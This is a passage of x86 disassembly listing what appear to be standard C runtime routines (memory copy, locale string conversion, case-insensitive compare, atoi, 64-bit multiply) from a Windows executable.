  4281d1:	mov    ebp,esp
  4281d3:	push   edi
  4281d4:	push   esi
  4281d5:	mov    esi,DWORD PTR [ebp+0xc]
  4281d8:	mov    ecx,DWORD PTR [ebp+0x10]
  4281db:	mov    edi,DWORD PTR [ebp+0x8]
  4281de:	mov    eax,ecx
  4281e0:	mov    edx,ecx
  4281e2:	add    eax,esi
  4281e4:	cmp    edi,esi
  4281e6:	jbe    0x4281f0
  4281e8:	cmp    edi,eax
  4281ea:	jb     0x42836c
  4281f0:	test   edi,0x3
  4281f6:	jne    0x42820c
  4281f8:	shr    ecx,0x2
  4281fb:	and    edx,0x3
  4281fe:	cmp    ecx,0x8
  428201:	jb     0x42822c
  428203:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428205:	jmp    DWORD PTR [edx*4+0x42831c]
  42820c:	mov    eax,edi
  42820e:	mov    edx,0x3
  428213:	sub    ecx,0x4
  428216:	jb     0x428224
  428218:	and    eax,0x3
  42821b:	add    ecx,eax
  42821d:	jmp    DWORD PTR [eax*4+0x428230]
  428224:	jmp    DWORD PTR [ecx*4+0x42832c]
  42822b:	nop
  42822c:	jmp    DWORD PTR [ecx*4+0x4282b0]
  428233:	nop
  428234:	inc    eax
  428235:	add    BYTE PTR [edx+0x0],0x6c
  428239:	add    BYTE PTR [edx+0x0],0x90
  42823d:	add    BYTE PTR [edx+0x0],0x23
  428241:	ror    DWORD PTR [edx-0x75f877fa],1
  428247:	inc    esi
  428248:	add    DWORD PTR [eax+0x468a0147],ecx
  42824e:	add    al,cl
  428250:	jmp    0x28a0a57
  428255:	add    esi,0x3
  428258:	add    edi,0x3
  42825b:	cmp    ecx,0x8
  42825e:	jb     0x42822c
  428260:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428262:	jmp    DWORD PTR [edx*4+0x42831c]
  428269:	lea    ecx,[ecx+0x0]
  42826c:	and    edx,ecx
  42826e:	mov    al,BYTE PTR [esi]
  428270:	mov    BYTE PTR [edi],al
  428272:	mov    al,BYTE PTR [esi+0x1]
  428275:	shr    ecx,0x2
  428278:	mov    BYTE PTR [edi+0x1],al
  42827b:	add    esi,0x2
  42827e:	add    edi,0x2
  428281:	cmp    ecx,0x8
  428284:	jb     0x42822c
  428286:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428288:	jmp    DWORD PTR [edx*4+0x42831c]
  42828f:	nop
  428290:	and    edx,ecx
  428292:	mov    al,BYTE PTR [esi]
  428294:	mov    BYTE PTR [edi],al
  428296:	add    esi,0x1
  428299:	shr    ecx,0x2
  42829c:	add    edi,0x1
  42829f:	cmp    ecx,0x8
  4282a2:	jb     0x42822c
  4282a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282a6:	jmp    DWORD PTR [edx*4+0x42831c]
  4282ad:	lea    ecx,[ecx+0x0]
  4282b0:	adc    eax,DWORD PTR [ebx-0x7cffffbe]
  4282b6:	inc    edx
  4282b7:	add    al,bh
  4282b9:	add    BYTE PTR [edx+0x0],0xf0
  4282bd:	add    BYTE PTR [edx+0x0],0xe8
  4282c1:	add    BYTE PTR [edx+0x0],0xe0
  4282c5:	add    BYTE PTR [edx+0x0],0xd8
  4282c9:	add    BYTE PTR [edx+0x0],0xd0
  4282cd:	add    BYTE PTR [edx+0x0],0x8b
  4282d1:	inc    esp
  4282d2:	mov    fs,esp
  4282d4:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  4282d8:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  4282dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4282e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4282e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4282e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4282ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4282f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4282f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4282f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4282fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  428300:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  428304:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  428308:	lea    eax,[ecx*4+0x0]
  42830f:	add    esi,eax
  428311:	add    edi,eax
  428313:	jmp    DWORD PTR [edx*4+0x42831c]
  42831a:	mov    edi,edi
  42831c:	sub    al,0x83
  42831e:	inc    edx
  42831f:	add    BYTE PTR [ebx+eax*4],dh
  428322:	inc    edx
  428323:	add    BYTE PTR [eax-0x7d],al
  428326:	inc    edx
  428327:	add    BYTE PTR [ebx+eax*4+0x42],dl
  42832b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  428331:	leave  
  428332:	ret    
  428333:	nop
  428334:	mov    al,BYTE PTR [esi]
  428336:	mov    BYTE PTR [edi],al
  428338:	mov    eax,DWORD PTR [ebp+0x8]
  42833b:	pop    esi
  42833c:	pop    edi
  42833d:	leave  
  42833e:	ret    
  42833f:	nop
  428340:	mov    al,BYTE PTR [esi]
  428342:	mov    BYTE PTR [edi],al
  428344:	mov    al,BYTE PTR [esi+0x1]
  428347:	mov    BYTE PTR [edi+0x1],al
  42834a:	mov    eax,DWORD PTR [ebp+0x8]
  42834d:	pop    esi
  42834e:	pop    edi
  42834f:	leave  
  428350:	ret    
  428351:	lea    ecx,[ecx+0x0]
  428354:	mov    al,BYTE PTR [esi]
  428356:	mov    BYTE PTR [edi],al
  428358:	mov    al,BYTE PTR [esi+0x1]
  42835b:	mov    BYTE PTR [edi+0x1],al
  42835e:	mov    al,BYTE PTR [esi+0x2]
  428361:	mov    BYTE PTR [edi+0x2],al
  428364:	mov    eax,DWORD PTR [ebp+0x8]
  428367:	pop    esi
  428368:	pop    edi
  428369:	leave  
  42836a:	ret    
  42836b:	nop
  42836c:	lea    esi,[ecx+esi*1-0x4]
  428370:	lea    edi,[ecx+edi*1-0x4]
  428374:	test   edi,0x3
  42837a:	jne    0x4283a0
  42837c:	shr    ecx,0x2
  42837f:	and    edx,0x3
  428382:	cmp    ecx,0x8
  428385:	jb     0x428394
  428387:	std    
  428388:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42838a:	cld    
  42838b:	jmp    DWORD PTR [edx*4+0x4284b8]
  428392:	mov    edi,edi
  428394:	neg    ecx
  428396:	jmp    DWORD PTR [ecx*4+0x428468]
  42839d:	lea    ecx,[ecx+0x0]
  4283a0:	mov    eax,edi
  4283a2:	mov    edx,0x3
  4283a7:	cmp    ecx,0x4
  4283aa:	jb     0x4283b8
  4283ac:	and    eax,0x3
  4283af:	sub    ecx,eax
  4283b1:	jmp    DWORD PTR [eax*4+0x4283bc]
  4283b8:	jmp    DWORD PTR [ecx*4+0x4284b8]
  4283bf:	nop
  4283c0:	int3   
  4283c1:	add    DWORD PTR [edx+0x0],0xfffffff0
  4283c5:	add    DWORD PTR [edx+0x0],0x18
  4283c9:	test   BYTE PTR [edx+0x0],al
  4283cc:	mov    al,BYTE PTR [esi+0x3]
  4283cf:	and    edx,ecx
  4283d1:	mov    BYTE PTR [edi+0x3],al
  4283d4:	sub    esi,0x1
  4283d7:	shr    ecx,0x2
  4283da:	sub    edi,0x1
  4283dd:	cmp    ecx,0x8
  4283e0:	jb     0x428394
  4283e2:	std    
  4283e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283e5:	cld    
  4283e6:	jmp    DWORD PTR [edx*4+0x4284b8]
  4283ed:	lea    ecx,[ecx+0x0]
  4283f0:	mov    al,BYTE PTR [esi+0x3]
  4283f3:	and    edx,ecx
  4283f5:	mov    BYTE PTR [edi+0x3],al
  4283f8:	mov    al,BYTE PTR [esi+0x2]
  4283fb:	shr    ecx,0x2
  4283fe:	mov    BYTE PTR [edi+0x2],al
  428401:	sub    esi,0x2
  428404:	sub    edi,0x2
  428407:	cmp    ecx,0x8
  42840a:	jb     0x428394
  42840c:	std    
  42840d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42840f:	cld    
  428410:	jmp    DWORD PTR [edx*4+0x4284b8]
  428417:	nop
  428418:	mov    al,BYTE PTR [esi+0x3]
  42841b:	and    edx,ecx
  42841d:	mov    BYTE PTR [edi+0x3],al
  428420:	mov    al,BYTE PTR [esi+0x2]
  428423:	mov    BYTE PTR [edi+0x2],al
  428426:	mov    al,BYTE PTR [esi+0x1]
  428429:	shr    ecx,0x2
  42842c:	mov    BYTE PTR [edi+0x1],al
  42842f:	sub    esi,0x3
  428432:	sub    edi,0x3
  428435:	cmp    ecx,0x8
  428438:	jb     0x428394
  42843e:	std    
  42843f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428441:	cld    
  428442:	jmp    DWORD PTR [edx*4+0x4284b8]
  428449:	lea    ecx,[ecx+0x0]
  42844c:	ins    BYTE PTR es:[edi],dx
  42844d:	test   BYTE PTR [edx+0x0],al
  428450:	je     0x4283d6
  428452:	inc    edx
  428453:	add    BYTE PTR [esp+eax*4+0x42],bh
  428457:	add    BYTE PTR [esp+eax*4-0x7b73ffbe],al
  42845e:	inc    edx
  42845f:	add    BYTE PTR [esp+eax*4-0x7b63ffbe],dl
  428466:	inc    edx
  428467:	add    BYTE PTR [edi-0x74ffbd7c],ch
  42846d:	inc    esp
  42846e:	mov    ds,WORD PTR [ecx+ecx*4]
  428471:	inc    esp
  428472:	(bad)  
  428473:	sbb    al,0x8b
  428475:	inc    esp
  428476:	mov    ds,WORD PTR [eax]
  428478:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42847c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428480:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428484:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428488:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42848c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428490:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428494:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428498:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42849c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4284a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4284a4:	lea    eax,[ecx*4+0x0]
  4284ab:	add    esi,eax
  4284ad:	add    edi,eax
  4284af:	jmp    DWORD PTR [edx*4+0x4284b8]
  4284b6:	mov    edi,edi
  4284b8:	enter  0x4284,0x0
  4284bc:	rol    BYTE PTR [edx+eax*2+0x4284e000],1
  4284c3:	add    ah,dh
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	mov    eax,DWORD PTR [ebp+0x8]
  4284cb:	pop    esi
  4284cc:	pop    edi
  4284cd:	leave  
  4284ce:	ret    
  4284cf:	nop
  4284d0:	mov    al,BYTE PTR [esi+0x3]
  4284d3:	mov    BYTE PTR [edi+0x3],al
  4284d6:	mov    eax,DWORD PTR [ebp+0x8]
  4284d9:	pop    esi
  4284da:	pop    edi
  4284db:	leave  
  4284dc:	ret    
  4284dd:	lea    ecx,[ecx+0x0]
  4284e0:	mov    al,BYTE PTR [esi+0x3]
  4284e3:	mov    BYTE PTR [edi+0x3],al
  4284e6:	mov    al,BYTE PTR [esi+0x2]
  4284e9:	mov    BYTE PTR [edi+0x2],al
  4284ec:	mov    eax,DWORD PTR [ebp+0x8]
  4284ef:	pop    esi
  4284f0:	pop    edi
  4284f1:	leave  
  4284f2:	ret    
  4284f3:	nop
  4284f4:	mov    al,BYTE PTR [esi+0x3]
  4284f7:	mov    BYTE PTR [edi+0x3],al
  4284fa:	mov    al,BYTE PTR [esi+0x2]
  4284fd:	mov    BYTE PTR [edi+0x2],al
  428500:	mov    al,BYTE PTR [esi+0x1]
  428503:	mov    BYTE PTR [edi+0x1],al
  428506:	mov    eax,DWORD PTR [ebp+0x8]
  428509:	pop    esi
  42850a:	pop    edi
  42850b:	leave  
  42850c:	ret    
  42850d:	push   ebp
  42850e:	mov    ebp,esp
  428510:	sub    esp,0xc
  428513:	mov    eax,ds:0x4669f0
  428518:	xor    eax,DWORD PTR [ebp+0x4]
  42851b:	and    BYTE PTR [ebp-0x6],0x0
  42851f:	push   0x6
  428521:	mov    DWORD PTR [ebp-0x4],eax
  428524:	lea    eax,[ebp-0xc]
  428527:	push   eax
  428528:	push   0x1004
  42852d:	push   DWORD PTR [ebp+0x8]
  428530:	call   DWORD PTR ds:0x429060
  428536:	test   eax,eax
  428538:	jne    0x42853f
  42853a:	or     eax,0xffffffff
  42853d:	jmp    0x428549
  42853f:	lea    eax,[ebp-0xc]
  428542:	push   eax
  428543:	call   0x42884e
  428548:	pop    ecx
  428549:	mov    ecx,DWORD PTR [ebp-0x4]
  42854c:	xor    ecx,DWORD PTR [ebp+0x4]
  42854f:	call   0x42595c
  428554:	leave  
  428555:	ret    
  428556:	push   0x38
  428558:	push   0x429f08
  42855d:	call   0x425290
  428562:	mov    eax,ds:0x4669f0
  428567:	xor    eax,DWORD PTR [ebp+0x4]
  42856a:	mov    DWORD PTR [ebp-0x1c],eax
  42856d:	xor    edi,edi
  42856f:	mov    DWORD PTR [ebp-0x20],edi
  428572:	mov    DWORD PTR [ebp-0x24],edi
  428575:	mov    eax,DWORD PTR [ebp+0x14]
  428578:	mov    ebx,DWORD PTR [eax]
  42857a:	mov    DWORD PTR [ebp-0x28],ebx
  42857d:	mov    DWORD PTR [ebp-0x2c],edi
  428580:	mov    eax,DWORD PTR [ebp+0x8]
  428583:	cmp    eax,DWORD PTR [ebp+0xc]
  428586:	je     0x4286ff
  42858c:	lea    ecx,[ebp-0x40]
  42858f:	push   ecx
  428590:	push   eax
  428591:	mov    esi,DWORD PTR ds:0x4290d8
  428597:	call   esi
  428599:	test   eax,eax
  42859b:	je     0x4285bd
  42859d:	cmp    DWORD PTR [ebp-0x40],0x1
  4285a1:	jne    0x4285bd
  4285a3:	lea    eax,[ebp-0x40]
  4285a6:	push   eax
  4285a7:	push   DWORD PTR [ebp+0xc]
  4285aa:	call   esi
  4285ac:	test   eax,eax
  4285ae:	je     0x4285bd
  4285b0:	cmp    DWORD PTR [ebp-0x40],0x1
  4285b4:	jne    0x4285bd
  4285b6:	mov    DWORD PTR [ebp-0x2c],0x1
  4285bd:	cmp    DWORD PTR [ebp-0x2c],edi
  4285c0:	je     0x4285dc
  4285c2:	cmp    ebx,0xffffffff
  4285c5:	je     0x4285cb
  4285c7:	mov    esi,ebx
  4285c9:	jmp    0x4285d7
  4285cb:	push   DWORD PTR [ebp+0x10]
  4285ce:	call   0x4258a0
  4285d3:	pop    ecx
  4285d4:	mov    esi,eax
  4285d6:	inc    esi
  4285d7:	mov    DWORD PTR [ebp-0x44],esi
  4285da:	jmp    0x4285df
  4285dc:	mov    esi,DWORD PTR [ebp-0x44]
  4285df:	cmp    DWORD PTR [ebp-0x2c],edi
  4285e2:	jne    0x4285fe
  4285e4:	push   edi
  4285e5:	push   edi
  4285e6:	push   ebx
  4285e7:	push   DWORD PTR [ebp+0x10]
  4285ea:	push   0x1
  4285ec:	push   DWORD PTR [ebp+0x8]
  4285ef:	call   DWORD PTR ds:0x429104
  4285f5:	mov    esi,eax
  4285f7:	mov    DWORD PTR [ebp-0x44],esi
  4285fa:	cmp    esi,edi
  4285fc:	je     0x428656
  4285fe:	mov    DWORD PTR [ebp-0x4],edi
  428601:	lea    eax,[esi+esi*1]
  428604:	add    eax,0x3
  428607:	and    eax,0xfffffffc
  42860a:	call   0x4252e0
  42860f:	mov    DWORD PTR [ebp-0x18],esp
  428612:	mov    ebx,esp
  428614:	mov    DWORD PTR [ebp-0x48],ebx
  428617:	lea    eax,[esi+esi*1]
  42861a:	push   eax
  42861b:	push   edi
  42861c:	push   ebx
  42861d:	call   0x427b90
  428622:	add    esp,0xc
  428625:	or     DWORD PTR [ebp-0x4],0xffffffff
  428629:	jmp    0x428642
  42862b:	xor    eax,eax
  42862d:	inc    eax
  42862e:	ret    
  42862f:	mov    esp,DWORD PTR [ebp-0x18]
  428632:	call   0x428725
  428637:	xor    edi,edi
  428639:	xor    ebx,ebx
  42863b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42863f:	mov    esi,DWORD PTR [ebp-0x44]
  428642:	cmp    ebx,edi
  428644:	jne    0x428664
  428646:	push   esi
  428647:	push   0x2
  428649:	call   0x4263a8
  42864e:	pop    ecx
  42864f:	pop    ecx
  428650:	mov    ebx,eax
  428652:	cmp    ebx,edi
  428654:	jne    0x42865d
  428656:	xor    eax,eax
  428658:	jmp    0x428711
  42865d:	mov    DWORD PTR [ebp-0x24],0x1
  428664:	push   esi
  428665:	push   ebx
  428666:	push   DWORD PTR [ebp-0x28]
  428669:	push   DWORD PTR [ebp+0x10]
  42866c:	push   0x1
  42866e:	push   DWORD PTR [ebp+0x8]
  428671:	call   DWORD PTR ds:0x429104
  428677:	test   eax,eax
  428679:	je     0x428702
  42867f:	cmp    DWORD PTR [ebp+0x18],edi
  428682:	je     0x4286a4
  428684:	push   edi
  428685:	push   edi
  428686:	push   DWORD PTR [ebp+0x1c]
  428689:	push   DWORD PTR [ebp+0x18]
  42868c:	push   esi
  42868d:	push   ebx
  42868e:	push   edi
  42868f:	push   DWORD PTR [ebp+0xc]
  428692:	call   DWORD PTR ds:0x429098
  428698:	test   eax,eax
  42869a:	je     0x428702
  42869c:	mov    eax,DWORD PTR [ebp+0x18]
  42869f:	mov    DWORD PTR [ebp-0x20],eax
  4286a2:	jmp    0x428702
  4286a4:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a7:	jne    0x4286bf
  4286a9:	push   edi
  4286aa:	push   edi
  4286ab:	push   edi
  4286ac:	push   edi
  4286ad:	push   esi
  4286ae:	push   ebx
  4286af:	push   edi
  4286b0:	push   DWORD PTR [ebp+0xc]
  4286b3:	call   DWORD PTR ds:0x429098
  4286b9:	mov    esi,eax
  4286bb:	cmp    esi,edi
  4286bd:	je     0x428702
  4286bf:	push   esi
  4286c0:	push   0x1
  4286c2:	call   0x4263a8
  4286c7:	pop    ecx
  4286c8:	pop    ecx
  4286c9:	mov    DWORD PTR [ebp-0x20],eax
  4286cc:	cmp    eax,edi
  4286ce:	je     0x428702
  4286d0:	push   edi
  4286d1:	push   edi
  4286d2:	push   esi
  4286d3:	push   eax
  4286d4:	push   esi
  4286d5:	push   ebx
  4286d6:	push   edi
  4286d7:	push   DWORD PTR [ebp+0xc]
  4286da:	call   DWORD PTR ds:0x429098
  4286e0:	cmp    eax,edi
  4286e2:	jne    0x4286f2
  4286e4:	push   DWORD PTR [ebp-0x20]
  4286e7:	call   0x425e9a
  4286ec:	pop    ecx
  4286ed:	mov    DWORD PTR [ebp-0x20],edi
  4286f0:	jmp    0x428702
  4286f2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4286f6:	je     0x428702
  4286f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4286fb:	mov    DWORD PTR [ecx],eax
  4286fd:	jmp    0x428702
  4286ff:	mov    ebx,DWORD PTR [ebp-0x48]
  428702:	cmp    DWORD PTR [ebp-0x24],edi
  428705:	je     0x42870e
  428707:	push   ebx
  428708:	call   0x425e9a
  42870d:	pop    ecx
  42870e:	mov    eax,DWORD PTR [ebp-0x20]
  428711:	lea    esp,[ebp-0x54]
  428714:	mov    ecx,DWORD PTR [ebp-0x1c]
  428717:	xor    ecx,DWORD PTR [ebp+0x4]
  42871a:	call   0x42595c
  42871f:	call   0x4252cb
  428724:	ret    
  428725:	push   ebp
  428726:	mov    ebp,esp
  428728:	sub    esp,0x48
  42872b:	push   ebx
  42872c:	push   esi
  42872d:	push   edi
  42872e:	push   0x4
  428730:	pop    eax
  428731:	call   0x4252e0
  428736:	mov    ebx,esp
  428738:	push   0x1c
  42873a:	lea    eax,[ebp-0x24]
  42873d:	push   eax
  42873e:	push   ebx
  42873f:	call   DWORD PTR ds:0x42903c
  428745:	test   eax,eax
  428747:	je     0x4287ba
  428749:	mov    edi,DWORD PTR [ebp-0x20]
  42874c:	lea    eax,[ebp-0x48]
  42874f:	push   eax
  428750:	call   DWORD PTR ds:0x429040
  428756:	mov    eax,DWORD PTR [ebp-0x44]
  428759:	lea    esi,[eax-0x1]
  42875c:	not    esi
  42875e:	and    esi,ebx
  428760:	sub    esi,eax
  428762:	mov    DWORD PTR [ebp-0x4],eax
  428765:	mov    eax,ds:0x467084
  42876a:	mov    ecx,eax
  42876c:	dec    ecx
  42876d:	neg    ecx
  42876f:	sbb    ecx,ecx
  428771:	and    ecx,0xffff1000
  428777:	add    ecx,0x11000
  42877d:	add    ecx,edi
  42877f:	cmp    esi,ecx
  428781:	jb     0x4287ba
  428783:	cmp    eax,0x1
  428786:	je     0x4287d2
  428788:	mov    ebx,edi
  42878a:	mov    edi,0x1000
  42878f:	push   0x1c
  428791:	lea    eax,[ebp-0x24]
  428794:	push   eax
  428795:	push   ebx
  428796:	call   DWORD PTR ds:0x42903c
  42879c:	test   eax,eax
  42879e:	je     0x4287ba
  4287a0:	add    ebx,DWORD PTR [ebp-0x18]
  4287a3:	test   DWORD PTR [ebp-0x14],edi
  4287a6:	je     0x42878f
  4287a8:	test   BYTE PTR [ebp-0xf],0x1
  4287ac:	mov    ebx,DWORD PTR [ebp-0x24]
  4287af:	je     0x4287b6
  4287b1:	xor    eax,eax
  4287b3:	inc    eax
  4287b4:	jmp    0x4287ee
  4287b6:	cmp    esi,ebx
  4287b8:	jae    0x4287be
  4287ba:	xor    eax,eax
  4287bc:	jmp    0x4287ee
  4287be:	push   0x4
  4287c0:	push   edi
  4287c1:	push   DWORD PTR [ebp-0x4]
  4287c4:	push   ebx
  4287c5:	call   DWORD PTR ds:0x4290e4
  4287cb:	mov    eax,ds:0x467084
  4287d0:	jmp    0x4287d4
  4287d2:	mov    ebx,esi
  4287d4:	dec    eax
  4287d5:	neg    eax
  4287d7:	sbb    eax,eax
  4287d9:	and    eax,0x103
  4287de:	lea    ecx,[ebp-0x8]
  4287e1:	push   ecx
  4287e2:	inc    eax
  4287e3:	push   eax
  4287e4:	push   DWORD PTR [ebp-0x4]
  4287e7:	push   ebx
  4287e8:	call   DWORD PTR ds:0x429024
  4287ee:	lea    esp,[ebp-0x54]
  4287f1:	pop    edi
  4287f2:	pop    esi
  4287f3:	pop    ebx
  4287f4:	leave  
  4287f5:	ret    
  4287f6:	int3   
  4287f7:	int3   
  4287f8:	int3   
  4287f9:	int3   
  4287fa:	int3   
  4287fb:	int3   
  4287fc:	int3   
  4287fd:	int3   
  4287fe:	int3   
  4287ff:	int3   
  428800:	push   ebp
  428801:	mov    ebp,esp
  428803:	push   edi
  428804:	push   esi
  428805:	push   ebx
  428806:	mov    esi,DWORD PTR [ebp+0xc]
  428809:	mov    edi,DWORD PTR [ebp+0x8]
  42880c:	mov    al,0xff
  42880e:	mov    edi,edi
  428810:	or     al,al
  428812:	je     0x428846
  428814:	mov    al,BYTE PTR [esi]
  428816:	add    esi,0x1
  428819:	mov    ah,BYTE PTR [edi]
  42881b:	add    edi,0x1
  42881e:	cmp    ah,al
  428820:	je     0x428810
  428822:	sub    al,0x41
  428824:	cmp    al,0x1a
  428826:	sbb    cl,cl
  428828:	and    cl,0x20
  42882b:	add    al,cl
  42882d:	add    al,0x41
  42882f:	xchg   al,ah
  428831:	sub    al,0x41
  428833:	cmp    al,0x1a
  428835:	sbb    cl,cl
  428837:	and    cl,0x20
  42883a:	add    al,cl
  42883c:	add    al,0x41
  42883e:	cmp    al,ah
  428840:	je     0x428810
  428842:	sbb    al,al
  428844:	sbb    al,0xff
  428846:	movsx  eax,al
  428849:	pop    ebx
  42884a:	pop    esi
  42884b:	pop    edi
  42884c:	leave  
  42884d:	ret    
  42884e:	push   esi
  42884f:	push   edi
  428850:	call   0x425145
  428855:	mov    edi,DWORD PTR [eax+0x64]
  428858:	cmp    edi,DWORD PTR ds:0x466b4c
  42885e:	je     0x428867
  428860:	call   0x4265ef
  428865:	mov    edi,eax
  428867:	mov    esi,DWORD PTR [esp+0xc]
  42886b:	cmp    DWORD PTR [edi+0x28],0x1
  42886f:	movzx  eax,BYTE PTR [esi]
  428872:	jle    0x428882
  428874:	push   0x8
  428876:	push   eax
  428877:	push   edi
  428878:	call   0x4288d6
  42887d:	add    esp,0xc
  428880:	jmp    0x42888c
  428882:	mov    ecx,DWORD PTR [edi+0x48]
  428885:	movzx  eax,BYTE PTR [ecx+eax*2]
  428889:	and    eax,0x8
  42888c:	test   eax,eax
  42888e:	je     0x428893
  428890:	inc    esi
  428891:	jmp    0x42886b
  428893:	movzx  ecx,BYTE PTR [esi]
  428896:	inc    esi
  428897:	cmp    ecx,0x2d
  42889a:	mov    edx,ecx
  42889c:	je     0x4288a3
  42889e:	cmp    ecx,0x2b
  4288a1:	jne    0x4288a7
  4288a3:	movzx  ecx,BYTE PTR [esi]
  4288a6:	inc    esi
  4288a7:	xor    eax,eax
  4288a9:	cmp    ecx,0x30
  4288ac:	jl     0x4288b8
  4288ae:	cmp    ecx,0x39
  4288b1:	jg     0x4288b8
  4288b3:	sub    ecx,0x30
  4288b6:	jmp    0x4288bb
  4288b8:	or     ecx,0xffffffff
  4288bb:	cmp    ecx,0xffffffff
  4288be:	je     0x4288cc
  4288c0:	lea    eax,[eax+eax*4]
  4288c3:	lea    eax,[ecx+eax*2]
  4288c6:	movzx  ecx,BYTE PTR [esi]
  4288c9:	inc    esi
  4288ca:	jmp    0x4288a9
  4288cc:	cmp    edx,0x2d
  4288cf:	pop    edi
  4288d0:	pop    esi
  4288d1:	jne    0x4288d5
  4288d3:	neg    eax
  4288d5:	ret    
  4288d6:	push   ebp
  4288d7:	mov    ebp,esp
  4288d9:	push   ecx
  4288da:	mov    eax,DWORD PTR [ebp+0xc]
  4288dd:	lea    ecx,[eax+0x1]
  4288e0:	cmp    ecx,0x100
  4288e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4288e9:	ja     0x4288f4
  4288eb:	mov    ecx,DWORD PTR [ecx+0x48]
  4288ee:	movzx  eax,WORD PTR [ecx+eax*2]
  4288f2:	jmp    0x428948
  4288f4:	push   esi
  4288f5:	mov    edx,eax
  4288f7:	sar    edx,0x8
  4288fa:	push   edi
  4288fb:	mov    edi,DWORD PTR [ecx+0x48]
  4288fe:	movzx  esi,dl
  428901:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428906:	pop    edi
  428907:	pop    esi
  428908:	je     0x428919
  42890a:	and    BYTE PTR [ebp-0x2],0x0
  42890e:	push   0x2
  428910:	mov    BYTE PTR [ebp-0x3],al
  428913:	mov    BYTE PTR [ebp-0x4],dl
  428916:	pop    eax
  428917:	jmp    0x428923
  428919:	and    BYTE PTR [ebp-0x3],0x0
  42891d:	mov    BYTE PTR [ebp-0x4],al
  428920:	xor    eax,eax
  428922:	inc    eax
  428923:	push   0x1
  428925:	push   DWORD PTR [ecx+0x14]
  428928:	push   DWORD PTR [ecx+0x4]
  42892b:	lea    ecx,[ebp+0xe]
  42892e:	push   ecx
  42892f:	push   eax
  428930:	lea    eax,[ebp-0x4]
  428933:	push   eax
  428934:	push   0x1
  428936:	call   0x4279b8
  42893b:	add    esp,0x1c
  42893e:	test   eax,eax
  428940:	jne    0x428944
  428942:	leave  
  428943:	ret    
  428944:	movzx  eax,WORD PTR [ebp+0xe]
  428948:	and    eax,DWORD PTR [ebp+0x10]
  42894b:	leave  
  42894c:	ret    
  42894d:	int3   
  42894e:	int3   
  42894f:	int3   
  428950:	mov    eax,DWORD PTR [esp+0x8]
  428954:	mov    ecx,DWORD PTR [esp+0x10]
  428958:	or     ecx,eax
  42895a:	mov    ecx,DWORD PTR [esp+0xc]
  42895e:	jne    0x428969
  428960:	mov    eax,DWORD PTR [esp+0x4]
  428964:	mul    ecx
  428966:	ret    0x10
  428969:	push   ebx
  42896a:	mul    ecx
  42896c:	mov    ebx,eax
  42896e:	mov    eax,DWORD PTR [esp+0x8]
  428972:	mul    DWORD PTR [esp+0x14]
  428976:	add    ebx,eax
  428978:	mov    eax,DWORD PTR [esp+0x8]
  42897c:	mul    ecx
  42897e:	add    edx,ebx
  428980:	pop    ebx
  428981:	ret    0x10
  428984:	int3   
  428985:	int3   
  428986:	int3   
  428987:	int3   
  428988:	int3   
  428989:	int3   
  42898a:	int3   
  42898b:	int3   
  42898c:	int3   
  42898d:	int3   
  42898e:	int3   
  42898f:	int3   
  428990:	push   ebp
  428991:	mov    ebp,esp
  428993:	push   edi
  428994:	push   esi
  428995:	push   ebx
  428996:	mov    ecx,DWORD PTR [ebp+0x10]
  428999:	or     ecx,ecx
  42899b:	je     0x4289ea
  42899d:	mov    esi,DWORD PTR [ebp+0x8]
  4289a0:	mov    edi,DWORD PTR [ebp+0xc]
  4289a3:	mov    bh,0x41
  4289a5:	mov    bl,0x5a
  4289a7:	mov    dh,0x20
  4289a9:	lea    ecx,[ecx+0x0]
  4289ac:	mov    ah,BYTE PTR [esi]
  4289ae:	or     ah,ah
  4289b0:	mov    al,BYTE PTR [edi]
  4289b2:	je     0x4289db
  4289b4:	or     al,al
  4289b6:	je     0x4289db
  4289b8:	add    esi,0x1
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,bh
  4289c0:	jb     0x4289c8
  4289c2:	cmp    ah,bl
  4289c4:	ja     0x4289c8
  4289c6:	add    ah,dh
  4289c8:	cmp    al,bh
  4289ca:	jb     0x4289d2
  4289cc:	cmp    al,bl
  4289ce:	ja     0x4289d2
  4289d0:	add    al,dh
  4289d2:	cmp    ah,al
  4289d4:	jne    0x4289e1
  4289d6:	sub    ecx,0x1
  4289d9:	jne    0x4289ac
  4289db:	xor    ecx,ecx
  4289dd:	cmp    ah,al
